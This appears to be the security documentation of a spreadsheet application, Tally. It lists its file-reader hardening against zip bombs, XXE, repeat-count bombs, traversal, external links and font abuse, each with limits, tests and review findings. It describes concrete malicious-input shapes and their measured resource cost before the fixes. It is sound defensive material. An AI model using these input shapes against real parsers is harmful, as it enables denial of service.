# Security

Tally opens files from untrusted sources (mail attachments, downloads), so
every file reader treats its input as hostile. This document lists the
security requirements from `docs/architecture-plan.md` §5.4, says which work
package owns each one, and names the tests that prove the parts that are
implemented.

Test names are `crate::test-file::test` (for example
`tally-io-ods::malicious::zip_bomb_is_rejected_within_one_second` is
`crates/tally-io-ods/tests/malicious.rs`). Unit tests inside a crate are named
`crate::module::tests::name`. The malicious corpus lives in
`tests/fixtures/malicious/`. It is generated, together with the ODS and CSV
fixtures, by `python3 -I tests/fixtures/ods/gen_fixtures.py`.

## Summary

| # | Requirement | Owner | Status |
|---|---|---|---|
| 1 | Zip bombs | WP5 | Implemented |
| 2 | XML: DOCTYPE, entities, depth and attribute caps | WP5 | Implemented |
| 3 | Logical bombs (repeat counts, cell caps) | WP5, plus WP1 for engine-side storage | Implemented for the readers |
| 4 | Path traversal | WP5 | Implemented |
| 5 | Active content (macros, external links, HYPERLINK) | WP1, WP3, WP7; WP5 for file side | File side done; rest pending |
| 6 | Untrusted parsing happens in Rust only | WP5 (parsing), WP7 (IPC surface) | Parsing side done |
| 7 | Tauri hardening | WP7 | Implemented (see the WP7 section) |
| 8 | Engine DoS limits | WP1, WP2, WP3 | Implemented (text cap, linear wildcards, recalc watchdog, sheet cap, names by reference, per-formula and per-transaction work budgets) |
| 9 | Fuzzing | later (Phase A drops fuzz targets) | Corpus and a mutation smoke test exist |

Plus the CSV formula-injection guard (§5.3), which is described below.

The findings of the 2026-10-19 review (`docs/reviews/security-review-2026-10-19.md`)
are fixed; their regression tests generate the malicious inputs themselves
(`crates/tally-io-ods/tests/hardening.rs`, `crates/tally-engine/tests/security.rs`,
plus the CSV, functions and desktop tests named below), so nothing large is
committed.

The findings of the second review (`docs/reviews/security-review-2-2026-10-19.md`)
are fixed too; see [Review 2 fixes](#review-2-fixes) for each finding, its fix
and its tests (`crates/tally-engine/tests/security2.rs`,
`crates/tally-io-ods/tests/security2.rs`, `crates/tally-io-xlsx/tests/security2.rs`).
Timing tests that only hold in release builds are `#[ignore]`d; run them with
`cargo test --release -p tally-engine --features io --test security2 -- --ignored`.

## 1. Zip bombs (WP5, `crates/tally-io-ods/src/archive.rs`)

Default limits are in `tally_io_ods::Limits`. Callers can tighten them.

| Control | Default | Test |
|---|---|---|
| Entry count is capped before the zip crate indexes the central directory: the end-of-central-directory record (and the zip64 locator and record) are parsed by hand from the last 64 KiB + 22 bytes, and every EOCD candidate there is checked | 10,000 entries | `tally-io-ods::malicious::too_many_entries` (20,000 entries), `tally-io-ods::hardening::zip64_entry_flood_is_rejected_before_indexing` (zip64 flood like the review's `many2m.ods`, rejected in microseconds; it used 822 MB of RSS before), `tally-io-ods::hardening::entry_cap_uses_declared_count` |
| Central-directory size is capped the same way | 16 MiB (`archive::MAX_CENTRAL_DIRECTORY_BYTES`) | `tally-io-ods::hardening::huge_central_directory_is_rejected` |
| `sniff_is_ods` reads only the first local header; its slow path (mimetype not first) runs the same EOCD precheck before building the archive | same limits | `tally-io-ods::hardening::sniff_is_bounded` |
| Per-entry uncompressed bytes for `content.xml` | 2 GiB (`max_content_xml_bytes`; was 512 MiB) | `tally-io-ods::malicious::zip_bomb_hits_entry_cap_when_ratio_is_disabled`, `tally-io-ods::large_entries::content_xml_cap_is_exact_and_separate`, `tally-io-ods::large_entries::defaults_admit_a_100_mb_ods`, `tally-io-ods::large_entries::fifty_mb_ods_with_700_mb_content_xml_opens` (ignored; 54 MB file, 720 MB `content.xml`, run with `--release -- --ignored`) |
| Per-entry uncompressed bytes for every other entry | 64 MiB (`max_entry_bytes`) | same mechanism, see `archive::tests` |
| Total uncompressed bytes across the package | 4 GiB (`max_total_bytes`; was 2 GiB) | `tally-io-ods::malicious::total_bytes_cap` |
| Compression ratio, enforced once the package has produced more than 10 MiB in total (one floor per package, not per entry), as total output against the total compressed bytes pulled for the entries read | 200:1 (`max_ratio`) | `tally-io-ods::malicious::zip_bomb_is_rejected_within_one_second` (1 GiB of zeros compressed about 1000:1, rejected in about 70 ms in a debug build), `tally-io-ods::archive::tests::ratio_trips_after_floor`, `tally-io-ods::retained_strings::ratio_floor_is_per_package`, `tally-io-xlsx::retained_strings::ratio_floor_is_per_package` |
| An entry read a second time (a picture shown twice, every sheet pointing at one part) is charged to a re-read budget | 64 MiB (`archive::MAX_REREAD_BYTES`) | `tally-io-ods::archive::tests::rereads_are_budgeted`, same in `tally-io-xlsx` |
| Sizes declared in zip headers are never trusted | every read goes through `Read::take(limit + 1)` and a counting guard | `tally-io-ods::archive::tests::take_bounds_a_lying_entry`, `tally-io-ods::malicious::lying_size_header_is_bounded` |

How it works:

- The ratio is checked continuously against the compressed bytes actually
  pulled from the archive. The archive reader is wrapped in a byte counter, so
  a bomb is caught after about 10 MiB of output instead of after the whole
  entry has inflated. Before the 2026-10-23 security review each entry had
  its own 10 MiB floor, so many entries just under it (or one entry read
  many times) escaped the ratio; the floor and the ratio are now per
  package.
- XML is streamed from the inflating entry through a 64 KiB buffer. No entry is
  ever buffered whole, except the tiny `mimetype` entry.

Why `content.xml` may reach 2 GiB (changed 2026-10-23): ODS XML compresses
about 12:1, so the 1.0 target of opening a 50 MB ODS means a `content.xml`
of about 600 MB, which the old 512 MiB cap refused
(`docs/perf-baseline.md`). The entry is streamed, so the byte cap is not
what bounds memory, but it is not only a time bound either: anything a
parser keeps grows with the entry. The first version of this change missed
that, and the security review of 2026-10-23 measured it (H1): a 10.4 MB ODS
with 9,500 sheets named about 200 KiB each reached 3.4 GB RSS, and an XLSX
with 99,000 hyperlinks whose `r:id` was 20 KB reached 2.2 GB. Memory is now
bounded by:

- the per-event cap of the XML reader (64 MiB, section 2): no single tag or
  text run can make quick-xml buffer more than that;
- `max_cells` (10,000,000) and `max_text_bytes` (1 GiB), checked before
  anything is materialized. A numeric 100 MB ODS of the perf generator's
  shape (about 11 M cells) hits `max_cells`;
- the package attribute budget `max_attr_bytes` (256 MiB, section 2): every
  attribute value on an element other than the per-cell ones (rows, cells,
  text runs) is charged to it, whether the parser keeps it or not, so the
  strings parsers keep from sheets, columns, styles, links, names, charts,
  pivots and so on are bounded per package, not per entry;
- per-value caps where a value is kept: sheet and style names 1 KiB
  (refused past it), relationship ids 256 bytes and `table:table-source`
  links 1 KiB (dropped past it), and any attribute of a cell element except
  `office:string-value` and `table:formula` 1 KiB (read as empty past it;
  those two have their own caps).

Re-measured after the fix (release, `/usr/bin/time -l` of `perf --open-rss`,
which runs `EngineService::open`): the 9,500-sheet file is refused
(`sheet name bytes`) in 0.2 s at 24 MB; the same with 1,000-byte names opens
in 0.26 s at 70 MB; the 99,000-link XLSX is refused (`XML attribute bytes`)
in 0.27 s at 81 MB.

Work, not memory: under the 200:1 ratio, 2 GiB of output needs at least
10 MiB of real compressed input, and the reader parses about 75 - 150 MB/s
of XML (release, cells included). A file can still make the reader spend
tens of seconds: one ODS `content.xml` at the cap, or an XLSX whose sheets
together reach the 4 GiB total. Before the review fix the cost could also
be multiplied without input: each entry read had its own ratio-free 10 MiB,
and XLSX sheets could all point at one part, so a 24.8 KB XLSX with 400
sheets sharing one 7.8 MB part took 34 s of CPU and 1.29 GB (M1). Now the
ratio floor is per package, an entry read again is charged to a 64 MiB
re-read budget, and two sheets naming the same worksheet part are refused
(`retained_strings::sheets_cannot_share_a_worksheet_part`; that file is
refused in 0.06 s at 19 MB). So the CPU an attacker can force is roughly
proportional to the bytes they send times the 200:1 ratio, capped by the
4 GiB total. A small file that inflates to gigabytes is still refused by
the ratio check after about 10 MiB of output
(`malicious::zip_bomb_is_rejected_within_one_second`: 1 GiB of zeros in a
1 MB file, refused in under a second). The total budget is 4 GiB so that
`content.xml` at its cap plus every other part still fits. Entry floods are
unaffected (EOCD precheck, `malicious::too_many_entries`,
`hardening::zip64_entry_flood_is_rejected_before_indexing`).

The limit errors of the ODS, XLSX and CSV readers and the engine's file-size
check all read `limit exceeded: the file is too large or complex to open
safely (<what> over <limit>)`, with byte limits in KiB/MiB/GiB
(`large_entries::limit_message_is_readable`). The app turns a `bad_file`
error of that shape into the localised `error.fileTooLarge` (en/de/fr/es);
`limitDetail` in `packages/app/src/dataOps.ts` also accepts the older
`<what> (limit <n>)` form that the XLS, dBase and HTML readers still use.

## 2. XML (WP5, `crates/tally-io-ods/src/xml.rs`)

Every XML stream in the package (`content.xml`, `styles.xml`, `settings.xml`,
`meta.xml`, `META-INF/manifest.xml`) goes through one hardened reader.

| Control | Test |
|---|---|
| Any `<!DOCTYPE>` is rejected with `OdsError::ForbiddenDoctype`. ODF never needs one, so this blocks XXE and entity-expansion attacks outright. | `tally-io-ods::malicious::doctype_with_external_entity_is_forbidden`, `tally-io-ods::malicious::billion_laughs_is_forbidden`, `tally-io-ods::malicious::doctype_in_styles_xml_is_forbidden` |
| quick-xml never fetches or expands external entities. It does not even expand internal DTD entities; it reports them as references. | `tally-io-ods::malicious::quick_xml_does_not_resolve_external_entities` |
| Only the five predefined entities and character references are resolved. Any other entity reference is an error. | `tally-io-ods::fixtures::libreoffice_shapes` (`&lt; &amp; &quot; &#x263A;`) |
| Element depth is capped. | `tally-io-ods::malicious::deep_nesting_hits_depth_cap` (100,000 levels, rejected at 256) |
| Attributes per element are capped. | `tally-io-ods::malicious::attribute_flood_hits_cap` (300 attributes, limit 256) |
| Text is capped at 16 MiB per cell (`text:p` and `office:string-value`). A `text:s text:c="4000000000"` cannot allocate gigabytes. | `tally-io-ods::malicious::space_bomb_is_rejected`, `tally-io-ods::hardening::huge_string_value_is_rejected` |
| Attribute values are budgeted per package: values on elements other than rows, cells and text runs count against `Limits::max_attr_bytes` (256 MiB, one budget for every XML stream of the package, `xml::AttrBudget`); values on those cell elements longer than 1 KiB read as empty (except `office:string-value` and `table:formula`, which have their own caps); sheet and style names over 1 KiB are refused; long ids and link targets that are kept are dropped. | `tally-io-ods::retained_strings::*`, `tally-io-xlsx::retained_strings::*` |
| One XML event (a start tag with its attributes, a text run, a comment) may span at most 64 MiB of input (`xml::MAX_EVENT_BYTES`): the reader is wrapped in a byte budget that is reset before every event, so quick-xml never buffers more than that, however large the entry. This also fixes the review's `bigattr.ods` (a 400 MiB attribute on a skipped element, 818 MB RSS before; now refused in about 0.2 s at 72 MB peak RSS). | `tally-io-ods::xml::tests::*`, `tally-io-ods::large_entries::huge_attribute_is_refused_by_the_event_cap`, same tests in `tally-io-xlsx::xml::tests` |

## 3. Logical bombs (WP5, `crates/tally-io-ods/src/content.rs`; CSV limits in `tally-io-csv`)

- Rows and cells are first parsed as run-length runs. They are expanded into
  `CellData` only after the cell count has been checked against `max_cells`
  (default 10,000,000, the Phase A reader limit). So the check happens before
  any allocation.
- An empty repeated row costs nothing, whatever its repeat count.
- A non-empty repeated row is materialized at most `max_repeat` times. Its
  cells are counted against `max_cells`.
- Repeat counts are clamped to the sheet limits: 1,048,576 rows and 16,384
  columns.
- Styled but empty runs larger than 4,096 cells are dropped. This is
  formatting of blank areas, which the Phase A model does not keep.

| Test | What it proves |
|---|---|
| `tally-io-ods::malicious::repeated_rows_bomb_hits_cell_cap_fast` | `number-rows-repeated="1048576"` × `number-columns-repeated="16384"` on a non-empty cell (17 G cells) is rejected in about 1 ms |
| `tally-io-ods::malicious::repeat_is_capped_by_max_repeat` | A non-empty repeated row is materialized at most `max_repeat` times |
| `tally-io-ods::malicious::cell_cap_applies_to_real_files` | The cell cap applies to ordinary files too |
| `tally-io-csv::csv::limits_are_enforced` | CSV `max_cells` (10M default), `max_rows` and `max_cols` |
| `tally-io-ods::hardening::formula_clone_bomb_hits_text_budget_fast` | A 205-byte formula repeated over 600 × 16,384 cells (the review's 460-byte `formula_clone.ods`, 2 GB RSS before) is rejected by the text budget before expansion |
| `tally-io-ods::hardening::repeated_formula_text_is_shared` | Repeated formula cells share one `Arc<str>` (`CellContentData::Formula.text` is `Arc<str>`) |
| `tally-io-ods::hardening::text_budget_counts_repeated_strings` | The budget counts each materialized cell's text, shared or not |
| `tally-io-ods::hardening::over_long_formula_is_rejected` | `table:formula` longer than 8,192 characters rejects the file (`formula length`) |
| `tally-io-ods::hardening::sheet_count_is_capped` | At most 10,000 sheets (`Limits::max_sheets`) |
| `tally-io-ods::hardening::merges_count_against_cell_cap` | Merges count against `max_cells` |
| `tally-io-ods::hardening::many_distinct_styles_are_fast` | Style deduplication is hash-based: 60,000 distinct styles in about 170 ms (release; 3.2 s before) |
| `tally-io-ods::hardening::non_finite_numbers_become_empty` | `office:value="NaN"`, `inf`, `1e309` become empty cells (also as cached formula results) |
| `tally-io-ods::hardening::huge_date_years_do_not_panic` | Years outside ±99,999 are rejected before the day arithmetic (a debug-build overflow panic before); the cell keeps its text |

Further reader limits (`tally_io_ods::Limits`):

- `max_text_bytes` (default 1 GiB): total formula and string bytes
  materialized into the model, counted per cell, so a shared `Arc` still
  counts once for every cell it fills. Checked with `max_cells`, before
  a repeated row is expanded.
- `max_sheets` (default 10,000).
- Formulas over 8,192 characters (the parser's limit) reject the file with
  `LimitExceeded { what: "formula length" }`.

Deviation from the plan: the plan says "store repeated content as runs (never
materialize)". `tally_model::SheetData` has no run representation, so
repeated content is materialized up to the caps above. Storing runs would need
a model change (WP0 lead review) and engine support (WP1).

Merges and array blocks (review 2, HIGH-1 and HIGH-2): each merge counts
one cell against `max_cells`, and a sheet keeps at most 100,000 merges
(`content::MAX_MERGES_PER_SHEET`; later ones are dropped with a warning in
`WorkbookData.warnings`). An array formula block counts its whole area
(rows × columns, clamped to the sheet), because the engine turns every
covered cell into an array part: twenty `number-matrix-rows-spanned="1048576"`
cells in a 1 KB file are `LimitExceeded { what: "materialized cells" }`.
Number formats (HIGH-4): a data style whose code is longer than 4,096
characters (`tally_model::MAX_NUMBER_FORMAT_LEN`, however many parts it
has) reads as General, with a warning. Tests:
`tally-io-ods::security2::merges_per_sheet_are_capped`,
`tally-io-ods::security2::array_block_areas_count_against_the_cell_cap`,
`tally-io-ods::security2::over_long_number_formats_become_general`.

## 3b. XLSX reader (`crates/tally-io-xlsx`)

`read_xlsx` is hardened like the ODS reader and shares its defaults
(`tally_io_xlsx::Limits`): at most 10,000 zip entries (EOCD precheck before
indexing), 2 GiB per worksheet or `sharedStrings.xml` (was 512 MiB; same
reasoning as ODS `content.xml` in section 1), 64 MiB per other part, 4 GiB
in total, 64 MiB per XML event, 256 MiB of attribute values on non-cell
elements per package (`max_attr_bytes`), sheet names 1 KiB, relationship
ids 256 bytes (longer hyperlink and drawing ids are dropped), two sheets
may not share one worksheet part, a 200:1 compression ratio once the package
has inflated 10 MiB, a 64 MiB re-read budget, DOCTYPE rejected in every part, XML depth 256 and 256 attributes per
element, 10,000,000 materialized cells, 1 GiB of materialized text (each
cell's full text counts, even when cells share one shared string) and
10,000 sheets. Nothing is extracted to disk; relationship targets that
leave the package are ignored.

| Control | Test |
|---|---|
| Zip bombs, lying headers, entry floods, total bytes | `tally-io-xlsx::malicious::data_part_cap_is_exact_separate_and_matches_ods`, `tally-io-xlsx::malicious::zip_bomb_is_rejected_within_one_second`, `tally-io-xlsx::malicious::zip_bomb_hits_entry_cap_when_ratio_is_disabled`, `tally-io-xlsx::malicious::total_bytes_cap`, `tally-io-xlsx::malicious::lying_entry_count_is_rejected_before_indexing`, `tally-io-xlsx::malicious::too_many_real_entries` |
| XML: DOCTYPE, depth, attributes, entities | `tally-io-xlsx::malicious::doctype_is_forbidden_in_every_part`, `tally-io-xlsx::malicious::deep_nesting_hits_depth_cap`, `tally-io-xlsx::malicious::attribute_flood_hits_cap`, `tally-io-xlsx::malicious::quick_xml_does_not_resolve_external_entities` |
| Cell and text budgets, shared-string count | `tally-io-xlsx::malicious::cell_cap`, `tally-io-xlsx::malicious::text_budget_counts_every_shared_string_use`, `tally-io-xlsx::malicious::shared_string_count_is_capped`, `tally-io-xlsx::malicious::oversized_cell_text_is_rejected` |
| Traversal and external targets | `tally-io-xlsx::malicious::traversal_and_external_targets_are_ignored` |
| Merges count one cell each against `max_cells`, at most 100,000 per sheet (`sheet::MAX_MERGES_PER_SHEET`, warning past it) | `tally-io-xlsx::security2::merges_are_counted_and_capped` |
| An array formula's `ref` area counts against `max_cells` | `tally-io-xlsx::security2::array_block_area_counts` |
| `numFmt formatCode` (and `dxf` codes) over 4,096 characters read as General, with a warning | `tally-io-xlsx::security2::over_long_format_codes_become_general` |
| Shared formulas: members are `CellContentData::SharedFormula` sharing the anchor's text (`Arc<str>`), counted once against `max_text_bytes`; the engine parses each group once | `tally-io-xlsx::security2::shared_formula_members_share_one_text`, `tally-engine::security2::files::shared_formulas_parse_once` |
| `<col style>`: at most 16,384 `<col>` elements per sheet (warning past it); styles become one whole-column run per column, overlaps resolved last-wins in O(N + 16,384) | `tally-io-xlsx::security2::column_styles_are_one_run_per_column` |
| `<f>` text over 8,192 characters (the parser's limit) is a limit error | `sheet::MAX_FORMULA_TEXT` |
| Quoted sheet names containing `:` (`'a:b'!A1`) are not read as 3-D spans | `tally-io-xlsx::security2::quoted_sheet_names_with_colons` |
| `calcPr iterateCount` clamped to 32,767 (ODS `table:steps` too) | `tally-io-xlsx::security2::iterate_count_is_clamped`, `tally-io-ods::security2::iteration_steps_are_clamped` |
| `<autoFilter>` (`autofilter.rs`): filter columns only inside the `ref` width, one per column; `filter` values at most 100,000 and 16 MiB per column and 1,000,000 / 64 MiB per sheet (warning when values are dropped), 32,767 characters each; a column with two custom conditions opens unfiltered with a warning. The engine cuts an area that reaches the sheet's last row or column down to the sheet's cells at load (other areas are kept as written), and a refresh (`Workbook::reapply_filter`, `filter_info`, Top N thresholds) reads only the filtered columns' own cells, deciding empty cells once per column: a 48 KB file with `A1:XFD1048576` and 16,384 filtered columns took 549 s per refresh, now milliseconds | `tally-engine::quickwins_filter_find_csv::whole_sheet_autofilter_refreshes_quickly`, `…::csv::partial_autofilter_area_is_kept_as_written`, `tally-io-xlsx::tools::autofilter_values_are_capped_with_a_warning`, `tally-io-xlsx::tools::autofilter_control_characters_and_two_conditions` |
| Find & Replace "current selection only": at most 10,000 ranges; identical ranges count once and each column's ranges are merged into row intervals, so overlapping ranges read each cell once | `tally-engine::quickwins_filter_find_csv::overlapping_selection_ranges_are_merged` |

## 3c. Wave-5 readers and the PDF renderer (W5-3)

Every new reader validates its container before it allocates and enforces
budgets while materializing; the limits are constants of the crates and
tested by the malicious corpora in `crates/tally-io-xls/tests/fixtures.rs`,
`crates/tally-io-dbf/src/lib.rs`, `crates/tally-io-html/src/lib.rs`,
`crates/tally-io-ods/tests/sxc.rs` and `crates/tally-engine/tests/formats.rs`
(mutated and truncated fixtures through the service).

| Reader | Pre-checks | Budgets | Notes |
|---|---|---|---|
| XLS (`tally-io-xls`) | OLE2 signature; file ≤ 256 MiB; `prescan`: strict CFB chain walks, canonical container, BIFF budgets (see "Review 4 fixes") | ≤ 1024 sheets, ≤ 10 M cells, ≤ 512 MiB text/formula bytes; before calamine: ≤ 8 M dense cells, ≤ 256 MiB text estimate | calamine 0.37 decodes the rebuilt container and the sanitized BIFF stream under `catch_unwind` (a panic is `XlsError::Malformed`, never a crash); formulas are converted by Tally's own parser, nothing is evaluated from the file. |
| SXC (`tally-io-ods`) | zip `mimetype`; the ODS zip-bomb, XML depth/attribute and cell/text budgets | identical to ODS | names are mapped while reading; no extra allocation per element. |
| HTML (`tally-io-html`) | input ≤ 64 MiB (`MAX_INPUT_BYTES`) | ≤ 1024 tables, ≤ 10 M cells, ≤ 64 KiB per cell, `colspan`/`rowspan` clamped to 1000 | a hand-written tokenizer: no DOM, no script execution, `<script>`/`<style>`/`<template>` bodies skipped, entities decoded without recursion; formulas stay text (the engine recognizes numbers and dates only). |
| dBase (`tally-io-dbf`) | version byte, header length `= 32 + 32·fields + 1`, record length `= 1 + Σ field widths`, record count ≤ what the file holds (+1 for a truncated last record) | ≤ 2 M records, ≤ 1024 fields, ≤ 10 M cells, file ≤ 256 MiB | memo/binary fields are never followed (no `.dbt` is opened). |
| Flat ODS (`tally-io-ods`, `read_fods`) | whole file ≤ `max_content_xml_bytes` (2 GiB; the engine's file cap applies first); root must be `office:document` with the ODS media type | the ODS XML limits (DOCTYPE refused, depth, attributes, attribute budget, 64 MiB per event) and cell/repeat/text/sheet budgets, unchanged | two streaming passes over the bytes, the first stops at `office:body`; `parse_meta`/`parse_settings` stop at their element's end. Embedded objects and binary images are never decoded. Tests: `crates/tally-io-ods/tests/fods.rs` (DOCTYPE, deep nesting, repeat bomb, byte cap, truncations, 300 mutations). |
| Excel 2003 XML (`tally-io-xmlss`) | input ≤ 512 MiB (`Limits::max_bytes`); UTF-8 validated (UTF-16 / declared encodings decoded first, malformed bytes refused); `<!DOCTYPE>` rejected; only predefined entities and character references resolved | XML depth 256, 256 attributes per element, 64 MiB per XML event; ≤ 10 M cells (merges and array areas count; a spanned row is checked as a whole before it is expanded), ≤ 1 GiB text, ≤ 10,000 sheets, ≤ 64,000 style ids, ≤ 100,000 names; formula ≤ 8,192 bytes and cell text ≤ 16 MiB (else `LimitExceeded`); ≤ 100,000 merges, links and notes kept per sheet (one warning past it). Review 2026-11 (H1, H2): only the first `ss:Table` of a worksheet is read (as AOO's XSLT; later ones are skipped with a warning, so cells stay unique and sorted and columns cannot repeat); every whole-column style run (one per styled column, ≤ 16,384 per sheet) counts against the cell budget before it is made; empty `<Cell/>`s are dropped before a spanned row is placed, and the span is checked first against the cell budget (cells, merges, links and notes each count) and the text budget (cell text, formulas, link targets and note text, × rows), so rows × cells of work is bounded by them; warnings are deduplicated in O(1) and the "only the first N" warnings are said once per sheet; repeated sheet names take the next ` (n)` from a per-name counter. Measured (release, reviewer harness): 1.1 MB of 200 tables × full-width column styles 28 s / 4.4 GB → 18 ms / 9 MB; 1,000 such sheets 0.4 s / 275 MB in the reader and 3.1 GB after the engine load → refused in 29 ms / 169 MB; a full-sheet `ss:Span` row of 16,384 empty cells 28 s → 2 ms; the same with links (killed at 90 s) → refused in 5 ms; a spanned note 1.1 GB before refusing → 7 MB; 10,000 equal sheet names 3 s → 10 ms. HRef ≤ 8 KiB, notes cut at 32 KiB | quick-xml streaming, no recursion on the input's nesting; `ss:Index` must move forward (otherwise ignored), indexes past the grid drop the rest of the row/table with a warning; `ss:Span`/`MergeAcross`/`MergeDown` clamped to the grid; widths/heights finite, ≤ 2000 pt; `ss:Parent` chains walked iteratively, ≤ 64 levels, cycles cut. Tests: `crates/tally-io-xmlss/tests/malicious.rs` (2,000 random mutations among them). |
| SYLK (`tally-io-sylk`) | input ≤ 512 MiB; first record `ID;` (without an extension also a `C;` record in the first 64 KiB, so `ID;Name;Price` stays CSV: review L1) | ≤ 1 MiB per record, ≤ 10 M cells, ≤ 1 GiB text, ≤ 10,000 `P;P` formats, each ≤ `MAX_NUMBER_FORMAT_LEN` (4,096) bytes or refused before conversion (General, with a warning; deduplicated through a hash map), ≤ 100,000 array blocks. Review M2: 50 codes of 1 MB 1.9 s / 3.0 GB → 77 ms / 57 MB | coordinates parsed saturating and checked against the grid (cells outside are counted in a warning, never stored); numbers try at most 64 characters; R1C1 conversion refuses text over 64 KiB and references off the sheet. Tests: `crates/tally-io-sylk/tests/sylk.rs` (malformed records, absurd coordinates, caps, unterminated strings and formulas, invalid UTF-8, 4,000 mutations). |
| DIF (`tally-io-dif`) | input ≤ 512 MiB; a `DATA` topic is required | lines are split lazily with one line of look-ahead (no vector of lines; review M1: 256 MiB of newlines 3.5 GB → 275 MB, the file itself), each ≤ 1 MiB or the read stops with `LimitExceeded`; ≤ 1 MiB per multi-line string, ≤ 10 M cells, ≤ 1 GiB text | values past the grid are counted, not stored; number parsing bounded to 400 characters, non-finite refused. Tests: `crates/tally-io-dif/tests/dif.rs` (caps, 16,500 columns, unterminated strings, every truncation, 3,000 mutations). |
| Macro detection (`has_macros` in `tally-io-xlsx`, `-ods`, `-xls`; `fods_has_macros`) | zip: the EOCD precheck before the index is built | XLSX: `_rels/.rels` → the workbook part's `.rels` (≤ 1 MiB each, ≤ 10,000 relationships), a `vbaProject` or `xlMacrosheet` relationship whose target is in the package; ODS/SXC: entry names only; XLS: the compound-file directory walked with the prescan's strict chain walks (`_VBA_PROJECT_CUR` / `_VBA_PROJECT` storages) and `BOUNDSHEET` type 1 (Excel 4.0 macro sheet) in the globals; flat ODS: a namespace-resolving stream (the `http://openoffice.org/2004/office` `module` / `source-code` elements, any prefix) that ignores comments, CDATA and text and stops at `office:body` or the first XML error (review L3) | Nothing is executed; the result only drives the notice. |
| PDF/print (`tally-io-pdf`, `tally-engine/src/print.rs`) | — (the input is the document) | ≤ 10,000 pages per layout and per job (`print::MAX_PAGES` = `tally_io_pdf::MAX_PAGES`), ≤ 20 M cell positions per job and 1 M per page, 5 M items per job, ≤ 4 MB per chart SVG (`ChartSvgDto`) and 32 MB per job, ≤ 4096 characters per text item, 1000 lines per wrapped cell, ≤ 40 Mpx per preview, LRU of 4 jobs | SVGs come from the UI's own ECharts rendering and are parsed by usvg (no external resources: no resource directory, file `href`s resolve to nothing, only `data:` images of at most 8,192 px per side / 16 Mpx, no SVGZ); fonts are read from the system font database only (fontdb; document font names are matched against installed family names, see §3d), subsetted and embedded; the rasterizer (hayro) runs on the PDF Tally just wrote. Page previews are PNGs at 18–600 dpi (the shell clamps the dpi). |

External links and DDE (`crates/tally-engine/src/external.rs`): a `DDE()`
formula evaluates to `#N/A`, a reference into another file (`'file:///…'#$Sheet.A1`,
`[1]Sheet!A1`) to `#REF!`, a sheet linked to another file is imported as
values and a linked picture is dropped; nothing is ever fetched. Each case
is counted in `WorkbookInfo.external_links` and shown once as a warning;
the original formula text is kept in the cell for inspection.

`MULTIPLE.OPERATIONS` (what-if tables) re-evaluates formulas in a sandbox
that never writes the workbook, at most `tools::MAX_TABLE_OPS` (10,000)
times per recalculation (then Err:512), with at most 200,000 formulas per
call (a larger cone is Err:512), 20M units of sandbox work per recalc, 8
levels of nested `MULTIPLE.OPERATIONS` and 64 levels of re-evaluation.
Iterative calculation runs at most `steps` (≤ 32,767; ≤ 1,000 from a file)
rounds per cyclic component and at most 20M evaluations per recalc. The
solver evaluates the sandbox at most 10,000 times per request, within
`timeout_ms` (≤ 60 s, sampling included), and branch-and-bound is bounded
by `max_iterations` (≤ 100,000) nodes and a depth of 1,000.

## 3d. Document fonts (`tally-io-pdf/src/fonts.rs`, `tally-engine/src/fonts.rs`)

Documents name the fonts they want (ODS `style:font-face` /
`style:font-name` / `fo:font-family`, the default style's font; XLSX
`<font><name>`), and Tally uses an installed font of that name on screen,
in layout math and in print/PDF. The names are untrusted:

- **Names, never paths.** A name is cleaned on import
  (`tally_model::clean_font_name`: quotes and blanks trimmed, names with
  control characters dropped, at most 128 characters; `MAX_FONT_NAME_LEN`)
  and is only ever compared, ignoring ASCII case, with the family names of
  fonts fontdb found in the standard font directories (macOS
  `/System/Library/Fonts` (+ `Supplemental`), `/Library/Fonts`,
  `~/Library/Fonts`; Windows `%WINDIR%\Fonts` and the per-user fonts
  directory; Linux the fontconfig directories, `/usr/share/fonts`,
  `~/.local/share/fonts`, `~/.fonts`). A name that looks like a path is just
  a family that matches nothing (tests: `tally-io-pdf/tests/fonts.rs`
  `missing_family_falls_back_to_inter_with_a_warning`,
  `tally-io-ods/tests/default_font.rs` `hostile_font_names_stay_names`).
  ODS font-face declarations are capped at 4,096 per document.
- **Bounded loading.** Fonts are loaded into a context per operation (a
  render, a print job, an AutoFit, a pagination: `tally_io_pdf::FontContext`,
  `tally_engine::fonts::Measurer`), dropped with it. A context loads at most
  `MAX_SYSTEM_FACES` (64) system faces and `MAX_FONT_BYTES` (384 MiB) of
  font files, none larger than `MAX_FONT_FILE_BYTES` (256 MiB); faces of
  one collection (`.ttc`) share one read. At most `MAX_FONT_REQUESTS` (256)
  distinct (family, bold, italic) requests per context go to the system
  fonts. Limits are sticky: past them a context uses Inter and never
  reloads. Layout resolves each style's font once per operation and
  measures without per-character fallback; drawing searches the system
  fonts for at most 32 missing characters per render (a 128-character
  block without a match is not searched again).
- **Malformed system fonts do not take printing down.** Face parsing
  (ttf-parser, krilla/skrifa) runs under `catch_unwind` and a face that
  fails, panics or has nonsensical metrics is skipped (Inter is used); a
  panic while scanning the font directories leaves the database empty. If
  rendering a job with installed fonts fails or panics anyway (e.g. in
  subsetting), the job is rendered again with Inter only and a warning
  says so (`render_pdf`). Embedded fonts are subsets (krilla/subsetter).
- **Screen.** The grid quotes the cleaned name in the canvas font string
  (`packages/grid/src/renderer.ts` `cleanFamily`/`cssFontFamily`: quotes,
  backslashes and control characters removed, at most 128 characters),
  followed by metric-compatible substitutes and the app font; the webview
  only resolves installed fonts by name (no font is fetched; CSP
  `font-src 'self' data:`).
- A missing font falls back silently to a metric-compatible substitute
  (Arial ↔ Liberation Sans/Arimo, Times New Roman ↔ Liberation
  Serif/Tinos, Courier New ↔ Liberation Mono/Cousine, Calibri ↔ Carlito,
  Cambria ↔ Caladea; the grid uses the same groups) and then to the
  bundled Inter, with a warning in `render_pdf`'s report (not shown in the
  app: print jobs drop it).
- **XLSX export** writes font names of at most 31 characters (Excel's
  limit) and counts `<col width>` in the default font's digit width.
- **Font list (`list_fonts`, the font pickers).** The shell lists the
  families of the same fontdb scan (`tally_io_pdf::installed_font_families`):
  names, weights, styles and widths only; no font file is loaded and no path
  or data crosses to the webview. Hidden (`.`-prefixed) families and names
  with control characters are dropped, names cut to 128 characters, at most
  10,000 families × 64 faces. The list is cached per process; `refresh`
  rescans the directories (one scan per call). Names typed into the pickers
  are untrusted like document names: cleaned (control characters removed,
  ≤ 128 characters) and only ever matched against family names. Recently
  used fonts are kept in the webview's localStorage (≤ 8 names, re-cleaned
  on read). Test: `tally-desktop` `fonts::tests`, `tally-io-pdf` `tests/fonts.rs`
